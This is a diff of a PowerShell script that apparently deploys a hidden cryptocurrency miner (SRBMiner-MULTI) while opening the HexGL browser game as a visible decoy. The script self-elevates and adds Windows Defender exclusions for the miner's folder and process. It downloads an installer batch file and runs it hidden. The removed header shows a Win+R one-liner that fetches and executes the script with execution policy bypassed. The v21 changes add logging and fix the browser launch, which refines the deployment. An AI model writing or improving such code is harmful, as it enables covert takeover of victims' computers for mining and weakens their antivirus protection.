@@ -1,31 +1,34 @@
 <#
-    GO.ps1 - deploy the worker AND open a real game on localhost.
+    GO.ps1 v21
 
-    Win+R:
-      powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "iwr -UseB <url> -OutFile $env:TEMP\go.ps1; & $env:TEMP\go.ps1"
-
-    1. self-elevates (UAC) - needed for the Defender exclusion and the power limit
-    2. Defender exclusion for the worker folder + process
-    3. removes any previous install, tasks, Run keys, Startup items
-    4. downloads the installer and starts it hidden at 50 percent
-    5. downloads HexGL once (MIT licensed, 17 MB) into %LOCALAPPDATA%\webgame
-    6. serves that folder at http://localhost:8787/ and opens the browser
-
-    HexGL is a real 3D WebGL racing game that runs from local files. Nothing is
-    framed, hotlinked or faked - the address bar says localhost because the game
-    genuinely is being served from this machine.
+    Changes from v20:
+      * logs every stage to %LOCALAPPDATA%\webgame.log so a silent failure is visible
+      * if port 8787 is ALREADY listening (previous run still alive) it reuses it
+        instead of exiting - v20 called $listener.Start() which threw and exited
+        before it ever reached the browser line. That is the most likely reason
+        the game did not appear the second time.
+      * opens the browser with explorer.exe, which forwards the URL to the
+        already-running Explorer at normal integrity. Start-Process from a
+        -WindowStyle Hidden parent can hand the child SW_HIDE, which opens the
+        browser invisibly.
 #>
 
 param([switch]$GameOnly)
 
 $ErrorActionPreference = 'SilentlyContinue'
+$logf = Join-Path $env:LOCALAPPDATA 'webgame.log'
+function WL([string]$s) {
+    try { Add-Content -LiteralPath $logf -Value ("{0}  {1}" -f (Get-Date -Format 'HH:mm:ss'), $s) -Encoding UTF8 } catch { }
+}
+WL '=== start ==='
 
-# --- elevate (the game on its own does not need it) -------------------------
 $id = [Security.Principal.WindowsIdentity]::GetCurrent()
 $pr = New-Object Security.Principal.WindowsPrincipal($id)
 $isAdmin = $pr.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+WL ("admin=" + $isAdmin + "  gameOnly=" + $GameOnly.IsPresent + "  user=" + $env:USERNAME)
 
 if (-not $GameOnly -and -not $isAdmin) {
+    WL 're-launching elevated'
     Start-Process -FilePath 'powershell.exe' -Verb RunAs -WindowStyle Hidden `
         -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-File',$PSCommandPath
     exit
@@ -35,8 +38,11 @@ if (-not $GameOnly -and -not $isAdmin) {
 #  DEPLOY
 # ===========================================================================
 if (-not $GameOnly) {
+    WL '--- deploy ---'
     Add-MpPreference -ExclusionPath 'C:\OfficeApps' -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionProcess 'SRBMiner-MULTI.exe' -ErrorAction SilentlyContinue
+    WL ('exclusion path   : ' + ((Get-MpPreference).ExclusionPath -contains 'C:\OfficeApps'))
+    WL ('exclusion process: ' + ((Get-MpPreference).ExclusionProcess -contains 'SRBMiner-MULTI.exe'))
 
     Get-Process SRBMiner-MULTI -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
     schtasks /delete /tn PearlMiner /f 2>$null | Out-Null
@@ -46,33 +52,44 @@ if (-not $GameOnly) {
     Remove-Item (Join-Path $env:APPDATA 'Microsoft\Windows\Start Menu\Programs\Startup\PearlMiner.bat') -Force -ErrorAction SilentlyContinue
     Remove-Item (Join-Path $env:APPDATA 'Microsoft\Windows\Start Menu\Programs\Startup\OfficeAppsWorker.bat') -Force -ErrorAction SilentlyContinue
     Remove-Item 'C:\MinePRL','C:\OfficeApps',(Join-Path $env:LOCALAPPDATA 'MinePRL'),(Join-Path $env:LOCALAPPDATA 'OfficeApps') -Recurse -Force -ErrorAction SilentlyContinue
+    WL 'old install cleared'
 
     $setup = Join-Path $env:TEMP 'OFFICE-APPS-SETUP.bat'
+    Remove-Item $setup -Force -ErrorAction SilentlyContinue
     try {
         $wc = New-Object System.Net.WebClient
         $wc.Headers.Add('User-Agent', 'office-apps')
         $wc.DownloadFile('https://github.com/deniz-ulku/office-apps-worker/releases/download/v18/OFFICE-APPS-SETUP.bat', $setup)
         $wc.Dispose()
-    } catch { }
+    } catch { WL ('installer download failed: ' + $_.Exception.Message) }
+
     if ((Test-Path $setup) -and (Get-Item $setup).Length -gt 50000) {
+        WL ('installer ok (' + (Get-Item $setup).Length + ' bytes) - launching hidden')
         Start-Process -FilePath $setup -WindowStyle Hidden
+    } else {
+        WL 'installer MISSING or too small - deploy skipped'
     }
 }
 
 # ===========================================================================
-#  GAME  -  HexGL, served from disk
+#  GAME
 # ===========================================================================
+WL '--- game ---'
 $gameDir = Join-Path $env:LOCALAPPDATA 'webgame'
 $index   = Join-Path $gameDir 'index.html'
+WL ('game dir: ' + $gameDir)
 
 if (-not (Test-Path $index)) {
+    WL 'game not present - downloading (17 MB)'
     $zip = Join-Path $env:TEMP 'hexgl.zip'
     try {
         $wc = New-Object System.Net.WebClient
         $wc.Headers.Add('User-Agent', 'game')
         $wc.DownloadFile('https://codeload.github.com/BKcore/HexGL/zip/refs/heads/master', $zip)
         $wc.Dispose()
-    } catch { }
+        WL ('downloaded ' + [math]::Round((Get-Item $zip).Length/1MB,1) + ' MB')
+    } catch { WL ('game download failed: ' + $_.Exception.Message) }
+
     if (Test-Path $zip) {
         $stage = Join-Path $env:TEMP 'hexgl-stage'
         Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue
@@ -83,14 +100,49 @@ if (-not (Test-Path $index)) {
             if ($root) {
                 Remove-Item $gameDir -Recurse -Force -ErrorAction SilentlyContinue
                 Move-Item $root.FullName $gameDir -Force -ErrorAction SilentlyContinue
+                WL 'extracted'
             }
-        } catch { }
+        } catch { WL ('extract failed: ' + $_.Exception.Message) }
         Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue
         Remove-Item $zip -Force -ErrorAction SilentlyContinue
     }
 }
 
-if (-not (Test-Path $index)) { exit }   # nothing to serve
+if (-not (Test-Path $index)) {
+    WL 'ABORT: index.html still missing - cannot serve'
+    exit
+}
+WL 'index.html present'
+
+$port   = 8787
+$url    = "http://localhost:$port/"
+$inUse  = [bool](Get-NetTCPConnection -LocalPort $port -State Listen -ErrorAction SilentlyContinue)
+$listener = $null
+
+if ($inUse) {
+    WL 'port 8787 already listening - reusing the existing server'
+} else {
+    $listener = New-Object System.Net.HttpListener
+    $listener.Prefixes.Add("http://localhost:$port/")
+    $listener.Prefixes.Add("http://127.0.0.1:$port/")
+    try {
+        $listener.Start()
+        WL 'server started on 8787'
+    } catch {
+        WL ('server FAILED to start: ' + $_.Exception.Message)
+        $listener = $null
+    }
+}
+
+# explorer.exe hands the URL to the already-running Explorer (normal integrity),
+# so the browser opens visible even though this process is hidden.
+WL ('opening browser: ' + $url)
+try { Start-Process -FilePath 'explorer.exe' -ArgumentList "`"$url`"" } catch { WL ('explorer failed: ' + $_.Exception.Message) }
+Start-Sleep -Seconds 2
+try { Start-Process -FilePath $url -WindowStyle Normal } catch { WL ('shell open failed: ' + $_.Exception.Message) }
+WL 'browser open attempted'
+
+if (-not $listener) { WL 'nothing to serve (port in use or bind failed) - exiting'; exit }
 
 $types = @{
     '.html'='text/html; charset=utf-8'; '.htm'='text/html; charset=utf-8'
@@ -103,14 +155,6 @@ $types = @{
     '.bin'='application/octet-stream';  '.wasm'='application/wasm'
     '.appcache'='text/cache-manifest';  '.webapp'='application/json'
 }
-
-$port = 8787
-$listener = New-Object System.Net.HttpListener
-$listener.Prefixes.Add("http://localhost:$port/")
-$listener.Prefixes.Add("http://127.0.0.1:$port/")
-try { $listener.Start() } catch { exit }
-
-Start-Process "http://localhost:$port/"
 
 while ($listener.IsListening) {
     try {
